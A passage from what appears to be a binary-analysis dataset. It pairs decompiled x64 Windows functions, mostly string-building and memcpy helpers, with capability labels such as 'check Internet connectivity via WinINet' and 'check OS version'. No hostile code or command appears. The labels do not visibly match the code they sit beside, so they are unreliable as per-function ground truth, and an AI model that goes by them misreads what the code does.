fcn.1400b6b70();\n                            fcn.1400b6670(uVar8);\n                        } while( true );\n                    }\n                    fcn.140077920(&iStack88, uVar9, uVar12 - uVar9, 0);\n                }\n                iVar5 = *(piVar13 + 0xb);\n            }\n            if (0 < iVar5) {\n                fcn.140077ac0(&iStack88, *(piVar13 + 0x21));\n                if (iVar14 < 0) {\n                    fcn.1400767c0(&iStack88, -iVar14, *(piVar13 + 0x65));\n                    fcn.140076500(&iStack88, arg2, iVar6);\n                }\n                else {\n                    fcn.140076500(&iStack88, arg2 + iVar14, *(piVar13 + 0xb));\n                }\n            }\n            uVar4 = *(arg4 + 0x18) & 0xb0;\n            uStack152 = uStack176 + *(iStack88 + -0x18);\n            if ((*(arg4 + 0x18) & 0x200) != 0) {\n                uStack152 = uStack152 + piVar13[6];\n            }\n            aiStack80[0] = fcn.140075910(0, 0);\n            fcn.140077810(aiStack80, uStack152 * 2);\n            uVar12 = *(arg4 + 0x10);\n            piVar11 = &uStack92;\n            do {\n                if (*piVar11 < 5) {\n    // switch table (5 cases) at 0x1400fe560\n                    switch(*piVar11) {\n                    case 0:\n                        if (uVar4 == 0x10 && uStack152 < uVar12) {\n                            fcn.1400767c0(aiStack80, uVar12 - uStack152, in_stack_00000028);\n                        }\n                        break;\n                    case 1:\n                        if (uVar4 == 0x10 && uStack152 < uVar12) {\n                            fcn.1400767c0(aiStack80, uVar12 - uStack152, in_stack_00000028);\n                        }\n                        else {\n                            fcn.140077ac0(aiStack80, in_stack_00000028);\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg4 + 0x19) & 2) != 0) {\n                            fcn.140076500(aiStack80, piVar13[5], piVar13[6]);\n                        }\n                        break;\n                    case 3:\n                        if (uStack176 != 0) {\n                            fcn.140077ac0(aiStack80, *pcStack160);\n                        }\n                        break;\n                    case 4:\n                        fcn.140076610(aiStack80, &iStack88);\n                    }\n                }\n                piVar11 = piVar11 + 1;\n            } while (piVar11 != &iStack88);\n            if (1 < uStack176) {\n                fcn.140076500(aiStack80, pcStack160 + 1, uStack176 - 1);\n            }\n            uVar9 = *(aiStack80[0] + -0x18);\n            if (uVar9 < uVar12) {\n                if (uVar4 == 0x20) {\n                    fcn.1400767c0(aiStack80, uVar12 - uVar9, in_stack_00000028);\n                    uVar9 = uVar12;\n                }\n                else {\n                    fcn.140075d80(aiStack80, 0, 0, uVar12 - uVar9);\n                    uVar9 = uVar12;\n                }\n            }\n            uVar12 = piVar15 & 0xffffffff;\n            if ((piVar15 == '\\0') && (iVar6 = (**(*piVar3 + 0x60))(piVar3, aiStack80[0], uVar9),  uVar9 != iVar6)) {\n                uVar12 = 1;\n            }\n            piVar15 = piVar15 & 0xffffffffffffff00 | uVar12 & 0xff;\n            fcn.140075fa0(aiStack80[0] + -0x18);\n            fcn.140075fa0(iStack88 + -0x18);\n        }\n    }\ncode_r0x00014006abdf:\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar15;\n    *arg1 = piVar3;\n    return arg1;\n}\n",
        "token_count": 2336
    },
    "14006b55": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14006b550(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    ulong arg3_00;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong *arg1_00;\n    ulong uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int16_t *piVar12;\n    int64_t *piVar13;\n    int32_t iVar14;\n    int64_t *piVar15;\n    int64_t arg3_01;\n    uint16_t in_stack_00000028;\n    int16_t **in_stack_00000030;\n    uint64_t uStack176;\n    uint16_t *puStack160;\n    uint64_t uStack152;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar2 = *arg3;\n    piVar15 = arg3[1];\n    piVar5 = fcn.1400b3700(arg4 + 0xd0);\n    iVar6 = fcn.1400261c0(0x1400fb410);\n    piVar13 = *(*(arg4 + 0xd0) + 0x18) + iVar6 * 8;\n    iVar8 = *piVar13;\n    if (iVar8 == 0) {\n        arg1_00 = fcn.1400b6520(0x80);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b670;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.14009ae00(arg1_00, arg4 + 0xd0);\n        fcn.14009d930(*(arg4 + 0xd0), arg1_00, iVar6);\n        iVar8 = *piVar13;\n    }\n    piVar12 = *in_stack_00000030;\n    if (*piVar12 == *(iVar8 + 100)) {\n        uStack92 = *(iVar8 + 0x60);\n        uStack176 = *(iVar8 + 0x50);\n        puStack160 = *(iVar8 + 0x48);\n        if (*(piVar12 + -0xc) != 0) {\n            piVar12 = piVar12 + 1;\n        }\n    }\n    else {\n        uStack92 = *(iVar8 + 0x5c);\n        puStack160 = *(iVar8 + 0x38);\n        uStack176 = *(iVar8 + 0x40);\n    }\n    iVar6 = (**(*piVar5 + 0x28))(piVar5, 8, piVar12, piVar12 + *(piVar12 + -0xc));\n    arg3_01 = iVar6 - piVar12 >> 1;\n    if (arg3_01 != 0) {\n        iStack88 = fcn.14006c450(0, 0);\n        fcn.14006e440(&iStack88, iVar6 - piVar12);\n        iVar4 = *(iVar8 + 0x58);\n        iVar14 = arg3_01 - iVar4;\n        if (0 < iVar14) {\n            if (iVar4 < 0) {\n                iVar14 = arg3_01;\n            }\n            if (*(iVar8 + 0x18) == 0) {\n                fcn.14006d450(&iStack88, piVar12, iVar14);\n            }\n            else {\n                fcn.14006c850(&iStack88, 0, *(iStack88 + -0x18), iVar14 * 2);\n                uVar9 = *(iVar8 + 0x18);\n                arg3_00 = *(iVar8 + 0x10);\n                uVar1 = *(iVar8 + 0x24);\n                if (-1 < *(iStack88 + -8)) {\n                    fcn.14006c3e0(&iStack88);\n                }\n                iVar6 = iStack88;\n                iVar7 = fcn.1400b0190(iStack88, uVar1, arg3_00, uVar9);\n                if (-1 < *(iVar6 + -8)) {\n                    fcn.14006c3e0(&iStack88);\n                }\n                uVar11 = *(iStack88 + -0x18);\n                uVar10 = iVar7 - iStack88 >> 1;\n                if (uVar11 < uVar10) {\n                    uVar9 = fcn.1400b1a60(0x1400fead8, 0x1400feac2, uVar10, uVar11);\n                    fcn.14006caa0(aiStack80[0] + -0x18);\n                    do {\n                        fcn.14006caa0(iStack88 + -0x18);\n                        uVar9 = fcn.14000f000(uVar9);\n                    } while( true );\n                }\n                fcn.14006e550(&iStack88, uVar10, uVar11 - uVar10, 0);\n            }\n            iVar4 = *(iVar8 + 0x58);\n        }\n        if (0 < iVar4) {\n            fcn.14006e720(&iStack88, *(iVar8 + 0x22));\n            if (iVar14 < 0) {\n                fcn.14006d300(&iStack88, -iVar14, *(iVar8 + 0x66));\n                fcn.14006d030(&iStack88, piVar12, arg3_01);\n            }\n            else {\n                fcn.14006d030(&iStack88, piVar12 + iVar14, *(iVar8 + 0x58));\n            }\n        }\n        uStack152 = uStack176 + *(iStack88 + -0x18);\n        uVar3 = *(arg4 + 0x18) & 0xb0;\n        if ((*(arg4 + 0x18) & 0x200) != 0) {\n            uStack152 = uStack152 + *(iVar8 + 0x30);\n        }\n        aiStack80[0] = fcn.14006c450(0, 0);\n        fcn.14006e440(aiStack80, uStack152 * 2);\n        uVar11 = *(arg4 + 0x10);\n        piVar13 = &uStack92;\n        do {\n            if (*piVar13 < 5) {\n    // switch table (5 cases) at 0x1400feb24\n                switch(*piVar13) {\n                case 0:\n                    if (uVar3 == 0x10 && uStack152 < uVar11) {\n                        fcn.14006d300(aiStack80, uVar11 - uStack152, in_stack_00000028);\n                    }\n                    break;\n                case 1:\n                    if (uVar3 == 0x10 && uStack152 < uVar11) {\n                        fcn.14006d300(aiStack80, uVar11 - uStack152, in_stack_00000028);\n                    }\n                    else {\n                        fcn.14006e720(aiStack80, in_stack_00000028);\n                    }\n                    break;\n                case 2:\n                    if ((*(arg4 + 0x19) & 2) != 0) {\n                        fcn.14006d030(aiStack80, *(iVar8 + 0x28), *(iVar8 + 0x30));\n                    }\n                    break;\n                case 3:\n                    if (uStack176 != 0) {\n                        fcn.14006e720(aiStack80, *puStack160);\n                    }\n                    break;\n                case 4:\n                    fcn.14006d140(aiStack80, &iStack88);\n                }\n            }\n            piVar13 = piVar13 + 1;\n        } while (piVar13 != &iStack88);\n        if (1 < uStack176) {\n            fcn.14006d030(aiStack80, puStack160 + 1, uStack176 - 1);\n        }\n        uVar10 = *(aiStack80[0] + -0x18);\n        if (uVar10 < uVar11) {\n            if (uVar3 == 0x20) {\n                fcn.14006d300(aiStack80, uVar11 - uVar10, in_stack_00000028);\n                uVar10 = uVar11;\n            }\n            else {\n                fcn.14006c850(aiStack80, 0, 0, uVar11 - uVar10);\n                uVar10 = uVar11;\n            }\n        }\n        uVar11 = piVar15 & 0xffffffff;\n        if ((piVar15 == '\\0') && (iVar8 = (**(*piVar2 + 0x60))(piVar2, aiStack80[0], uVar10),  uVar10 != iVar8)) {\n            uVar11 = 1;\n        }\n        piVar15 = piVar15 & 0xffffffffffffff00 | uVar11 & 0xff;\n        fcn.14006caa0(aiStack80[0] + -0x18);\n        fcn.14006caa0(iStack88 + -0x18);\n    }\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar15;\n    *arg1 = piVar2;\n    return arg1;\n}\n",
        "token_count": 2293
    },
    "14006bc2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.14006bc20(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    ulong arg3_00;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong *arg1_00;\n    ulong uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int16_t *piVar12;\n    int64_t *piVar13;\n    int32_t iVar14;\n    int64_t *piVar15;\n    int64_t arg3_01;\n    uint16_t in_stack_00000028;\n    int16_t **in_stack_00000030;\n    uint64_t uStack176;\n    uint16_t *puStack160;\n    uint64_t uStack152;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar2 = *arg3;\n    piVar15 = arg3[1];\n    piVar5 = fcn.1400b3700(arg4 + 0xd0);\n    iVar6 = fcn.1400261c0(0x1400fb420);\n    piVar13 = *(*(arg4 + 0xd0) + 0x18) + iVar6 * 8;\n    iVar8 = *piVar13;\n    if (iVar8 == 0) {\n        arg1_00 = fcn.1400b6520(0x80);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x14010b690;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.14009b620(arg1_00, arg4 + 0xd0);\n        fcn.14009d930(*(arg4 + 0xd0), arg1_00, iVar6);\n        iVar8 = *piVar13;\n    }\n    piVar12 = *in_stack_00000030;\n    if (*piVar12 == *(iVar8 + 100)) {\n        uStack92 = *(iVar8 + 0x60);\n        uStack176 = *(iVar8 + 0x50);\n        puStack160 = *(iVar8 + 0x48);\n        if (*(piVar12 + -0xc) != 0) {\n            piVar12 = piVar12 + 1;\n        }\n    }\n    else {\n        uStack92 = *(iVar8 + 0x5c);\n        puStack160 = *(iVar8 + 0x38);\n        uStack176 = *(iVar8 + 0x40);\n    }\n    iVar6 = (**(*piVar5 + 0x28))(piVar5, 8, piVar12, piVar12 + *(piVar12 + -0xc));\n    arg3_01 = iVar6 - piVar12 >> 1;\n    if (arg3_01 != 0) {\n        iStack88 = fcn.14006c450(0, 0);\n        fcn.14006e440(&iStack88, iVar6 - piVar12);\n        iVar4 = *(iVar8 + 0x58);\n        iVar14 = arg3_01 - iVar4;\n        if (0 < iVar14) {\n            if (iVar4 < 0) {\n                iVar14 = arg3_01;\n            }\n            if (*(iVar8 + 0x18) == 0) {\n                fcn.14006d450(&iStack88, piVar12, iVar14);\n            }\n            else {\n                fcn.14006c850(&iStack88, 0, *(iStack88 + -0x18), iVar14 * 2);\n                uVar9 = *(iVar8 + 0x18);\n                arg3_00 = *(iVar8 + 0x10);\n                uVar1 = *(iVar8 + 0x24);\n                if (-1 < *(iStack88 + -8)) {\n                    fcn.14006c3e0(&iStack88);\n                }\n                iVar6 = iStack88;\n                iVar7 = fcn.1400b0190(iStack88, uVar1, arg3_00, uVar9);\n                if (-1 < *(iVar6 + -8)) {\n                    fcn.14006c3e0(&iStack88);\n                }\n                uVar11 = *(iStack88 + -0x18);\n                uVar10 = iVar7 - iStack88 >> 1;\n                if (uVar11 < uVar10) {\n                    uVar9 = fcn.1400b1a60(0x1400fead8, 0x1400feac2, uVar10, uVar11);\n                    fcn.14006caa0(aiStack80[0] + -0x18);\n                    do {\n                        fcn.14006caa0(iStack88 + -0x18);\n                        uVar9 = fcn.14000f000(uVar9);\n                    } while( true );\n                }\n                fcn.14006e550(&iStack88, uVar10, uVar11 - uVar10, 0);\n            }\n            iVar4 = *(iVar8 + 0x58);\n        }\n        if (0 < iVar4) {\n            fcn.14006e720(&iStack88, *(iVar8 + 0x22));\n            if (iVar14 < 0) {\n                fcn.14006d300(&iStack88, -iVar14, *(iVar8 + 0x66));\n                fcn.14006d030(&iStack88, piVar12, arg3_01);\n            }\n            else {\n                fcn.14006d030(&iStack88, piVar12 + iVar14, *(iVar8 + 0x58));\n            }\n        }\n        uStack152 = uStack176 + *(iStack88 + -0x18);\n        uVar3 = *(arg4 + 0x18) & 0xb0;\n        if ((*(arg4 + 0x18) & 0x200) != 0) {\n            uStack152 = uStack152 + *(iVar8 + 0x30);\n        }\n        aiStack80[0] = fcn.14006c450(0, 0);\n        fcn.14006e440(aiStack80, uStack152 * 2);\n        uVar11 = *(arg4 + 0x10);\n        piVar13 = &uStack92;\n        do {\n            if (*piVar13 < 5) {\n    // switch table (5 cases) at 0x1400feb10\n                switch(*piVar13) {\n                case 0:\n                    if (uVar3 == 0x10 && uStack152 < uVar11) {\n                        fcn.14006d300(aiStack80, uVar11 - uStack152, in_stack_00000028);\n                    }\n                    break;\n                case 1:\n                    if (uVar3 == 0x10 && uStack152 < uVar11) {\n                        fcn.14006d300(aiStack80, uVar11 - uStack152, in_stack_00000028);\n                    }\n                    else {\n                        fcn.14006e720(aiStack80, in_stack_00000028);\n                    }\n                    break;\n                case 2:\n                    if ((*(arg4 + 0x19) & 2) != 0) {\n                        fcn.14006d030(aiStack80, *(iVar8 + 0x28), *(iVar8 + 0x30));\n                    }\n                    break;\n                case 3:\n                    if (uStack176 != 0) {\n                        fcn.14006e720(aiStack80, *puStack160);\n                    }\n                    break;\n                case 4:\n                    fcn.14006d140(aiStack80, &iStack88);\n                }\n            }\n            piVar13 = piVar13 + 1;\n        } while (piVar13 != &iStack88);\n        if (1 < uStack176) {\n            fcn.14006d030(aiStack80, puStack160 + 1, uStack176 - 1);\n        }\n        uVar10 = *(aiStack80[0] + -0x18);\n        if (uVar10 < uVar11) {\n            if (uVar3 == 0x20) {\n                fcn.14006d300(aiStack80, uVar11 - uVar10, in_stack_00000028);\n                uVar10 = uVar11;\n            }\n            else {\n                fcn.14006c850(aiStack80, 0, 0, uVar11 - uVar10);\n                uVar10 = uVar11;\n            }\n        }\n        uVar11 = piVar15 & 0xffffffff;\n        if ((piVar15 == '\\0') && (iVar8 = (**(*piVar2 + 0x60))(piVar2, aiStack80[0], uVar10),  uVar10 != iVar8)) {\n            uVar11 = 1;\n        }\n        piVar15 = piVar15 & 0xffffffffffffff00 | uVar11 & 0xff;\n        fcn.14006caa0(aiStack80[0] + -0x18);\n        fcn.14006caa0(iStack88 + -0x18);\n    }\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar15;\n    *arg1 = piVar2;\n    return arg1;\n}\n",
        "token_count": 2293
    },
    "14006c3e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14006c3e0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *arg1;\n    if (*(iVar1 + -0x18) == 0) {\n        return;\n    }\n    if (**0x140102a70 == 0) {\n        if (*(iVar1 + -8) < 1) goto code_r0x00014006c40e;\n    }\n    else if (*(iVar1 + -8) < 1) {\n        iVar1 = *arg1;\n        goto code_r0x00014006c40e;\n    }\n    fcn.14006e550(arg1, 0, 0, 0);\n    iVar1 = *arg1;\ncode_r0x00014006c40e:\n    *(iVar1 + -8) = 0xffffffff;\n    return;\n}\n",
        "token_count": 191
    },
    "14006c45": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14006c450(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    piVar1 = fcn.14006cc20(arg1, 0);\n    if (arg1 != 0) {\n        iVar2 = 0;\n        if (arg1 == 1) {\n            *(piVar1 + 3) = arg2;\n        }\n        else {\n            do {\n                *(piVar1 + iVar2 * 2 + 0x18) = arg2;\n                iVar2 = iVar2 + 1;\n            } while (arg1 != iVar2);\n        }\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg1;\n    *(piVar1 + arg1 * 2 + 0x18) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 204
    },
    "14006c53": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14006c530(ushort *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    ushort *puVar3;\n    int64_t iVar4;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.14006cc20(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fdaa8;\n    fcn.1400b7080(0x1400fdaa8);\n    if ((arg2 == 0) || (puVar3 != NULL)) {\n        arg2 = arg2 - puVar3;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.14006cc20(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fd660;\n    fcn.1400b7080(0x1400fd660);\n    if ((arg2 == 0) || (puVar3 != NULL)) {\n        arg2 = arg2 - puVar3;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.14006cc20(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fea90;\n    fcn.1400b7080(0x1400fea90);\n    if ((arg2 != 0) && (puVar3 == NULL)) {\n        fcn.1400b7080(0x1400fdaa8);\n        return 0x1400fb380;\n    }\n    arg2 = arg2 - puVar3;\n    iVar4 = arg2 >> 1;\n    piVar1 = fcn.14006cc20(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 898
    },
    "14006c5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14006c5c0(ushort *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    ushort *puVar3;\n    int64_t iVar4;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.14006cc20(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fd660;\n    fcn.1400b7080(0x1400fd660);\n    if ((arg2 != 0) && (puVar3 == NULL)) {\n        puVar3 = 0x1400fea90;\n        fcn.1400b7080(0x1400fea90);\n        if ((arg2 != 0) && (puVar3 == NULL)) {\n            fcn.1400b7080(0x1400fdaa8);\n            return 0x1400fb380;\n        }\n        arg2 = arg2 - puVar3;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.14006cc20(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    arg2 = arg2 - puVar3;\n    iVar4 = arg2 >> 1;\n    piVar1 = fcn.14006cc20(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 686
    },
    "14006c65": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14006c650(ushort *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    ushort *puVar3;\n    int64_t iVar4;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.14006cc20(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x1400fea90;\n    fcn.1400b7080(0x1400fea90);\n    if ((arg2 != 0) && (puVar3 == NULL)) {\n        fcn.1400b7080(0x1400fdaa8);\n        return 0x1400fb380;\n    }\n    arg2 = arg2 - puVar3;\n    iVar4 = arg2 >> 1;\n    piVar1 = fcn.14006cc20(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 474
    },
    "14006c6e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14006c6e0(ushort *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t arg1_00;\n    \n    if ((arg2 != 0) && (arg1 == NULL)) {\n        fcn.1400b7080(0x1400fdaa8);\n        return 0x1400fb380;\n    }\n    arg2 = arg2 - arg1;\n    arg1_00 = arg2 >> 1;\n    piVar1 = fcn.14006cc20(arg1_00, 0);\n    piVar2 = piVar1 + 3;\n    if (arg1_00 == 1) {\n        *(piVar1 + 3) = *arg1;\n    }\n    else if (arg1_00 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg1_00;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 270
    },
    "14006c85": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.14006c850(int64_t *arg1, int64_t arg2, int64_t arg3, ushort *arg4)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    int64_t *arg1_00;\n    int64_t arg2_00;\n    int64_t unaff_RSI;\n    ushort in_stack_00000028;\n    \n    arg2_00 = *arg1;\n    if ((arg3 + 0x1ffffffffffffffc) - *(arg2_00 + -0x18) < arg4) {\n        arg1_00 = 0x1400fda21;\n        fcn.1400b7170(0x1400fda21);\n        fcn.14006e550(arg1_00, arg2_00, arg3, unaff_RSI);\n        if (unaff_RSI != 0) {\n            puVar1 = *arg1_00 + arg2_00 * 2;\n            if (unaff_RSI == 1) {\n                *puVar1 = *arg4;\n                return arg1_00;\n            }\n            sub.msvcrt.dll_memcpy(puVar1, arg4, unaff_RSI * 2);\n        }\n        return arg1_00;\n    }\n    fcn.14006e550(arg1, arg2, arg3, arg4);\n    if (arg4 == NULL) {\n        return arg1;\n    }\n    puVar1 = *arg1 + arg2 * 2;\n    puVar2 = NULL;\n    if (arg4 != 0x1) {\n        do {\n            puVar1[puVar2] = in_stack_00000028;\n            puVar2 = puVar2 + 1;\n        } while (arg4 != puVar2);\n        return arg1;\n    }\n    *puVar1 = in_stack_00000028;\n    return arg1;\n}\n",
        "token_count": 424
    },
    "14006cbb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
